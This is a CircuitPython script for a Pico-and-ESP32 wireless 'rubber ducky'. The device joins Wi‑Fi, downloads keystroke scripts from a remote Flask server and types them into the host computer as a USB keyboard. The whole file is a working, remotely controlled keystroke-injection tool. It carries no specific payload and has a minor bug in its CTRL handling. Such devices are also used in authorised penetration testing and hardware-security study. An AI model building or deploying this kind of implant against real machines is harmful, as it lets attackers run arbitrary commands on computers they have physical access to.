#Gets secrets (SSID, Password etc) from secrets.py file
from secrets import secrets
#Imports circuitpython/board specific libraries
import board
import busio
import time
import simpleio
import adafruit_rgbled
from digitalio import DigitalInOut
#Networking/ESP32 related libraries
import adafruit_requests as requests
import adafruit_esp32spi.adafruit_esp32spi_socket as socket
from adafruit_esp32spi import adafruit_esp32spi
#Keuboard HID related libraries
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

#Set up the RGB LED on the wireless kit
RED_LED = board.GP25
GREEN_LED = board.GP26
BLUE_LED = board.GP27
led = adafruit_rgbled.RGBLED(RED_LED, BLUE_LED, GREEN_LED)
led.color = (255, 0, 0)

#Set pins on wireless kit relating to ESP32 chip.
esp32_cs = DigitalInOut(board.GP7)
esp32_ready = DigitalInOut(board.GP10)
esp32_reset = DigitalInOut(board.GP11)

#Creates SPI connection for communication with ESP32
spi = busio.SPI(board.GP18, board.GP19, board.GP16)

#Sets up a SPIControl object, we can then use to setup sockets to send and recieve requests from 
esp = adafruit_esp32spi.ESP_SPIcontrol(spi, esp32_cs, esp32_ready, esp32_reset)
requests.set_socket(socket, esp)

#Connect to AP described in secrets
while not esp.is_connected:
    try:
        esp.connect_AP(secrets['SSID'], secrets['password'])
    except RuntimeError:
        continue

#Print SSID of network and assigned address
print(f"Connected to {secrets['SSID']}. IP Addr is {esp.pretty_ip(esp.ip_address)}")

#Get instructions from remote flask server.
instruction_URL = f"http://{secrets['server_ip']}:8000/download/{secrets['duckyname']}"

#Create request, and get text of response
instructions = requests.get(instruction_URL).text.split('\n')
print(instructions)

keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

#Parsing instructions.
for line in instructions:
    if line[:6] == "STRING":
        keyboard_layout.write(line[6:])
    elif line[:3] == "WIN" or line[:5] == "SUPER":
        keyboard.press(Keycode.GUI)
        keyboard.release_all()
    elif line[:5] == "ENTER":
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
    elif line[:4] == "CTRL":
        other_key = line[5:]
        keyboard.press(Keycode.CONTROL)

        keyboard_layout.write(other_key)
        keyboard_layout.release_all()
    elif line[:4] == "WAIT":
        time.sleep(float(line[4:]))
        